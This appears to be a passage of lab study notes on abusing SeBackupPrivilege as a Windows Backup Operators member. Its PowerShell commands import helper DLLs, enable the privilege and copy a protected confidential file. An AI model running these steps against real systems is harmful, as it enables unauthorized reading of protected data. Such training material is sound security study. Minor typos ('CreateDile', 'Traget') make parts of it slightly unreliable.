
---
### Backup Operators
```powershell
PS C:\htb> whoami /priv

Privilege Name                State
============================= =======
SeBackupPrivilege             Disabled
SeRestorePrivilege            Disabled
```

```powershell
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is disabled
```
#### Importing Libraries
We can't copy a file using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) flag.

Important Tools:
- [SeBackupPrivilegeUtils.dll ](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeUtils), a `C#` library, which encapsulate `Win32 API`(like `CreateDile`), and mark `FILE_FLAG_BACKUP_SEMANTICS`.
- [SeBackupPrivilegeCmdLets.dll](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets), a Powershell encapsulation, it turns the `C#` functions to Powershell commands(`Cmdlets`), like `Copy-FileSeBackupPrivilege`.

```powershell
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll 
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```
#### Enabling SeBackupPrivilege
```powershell
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege
```
#### Copying a Protected File
```powershell
PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' [Traget file path]
```
















































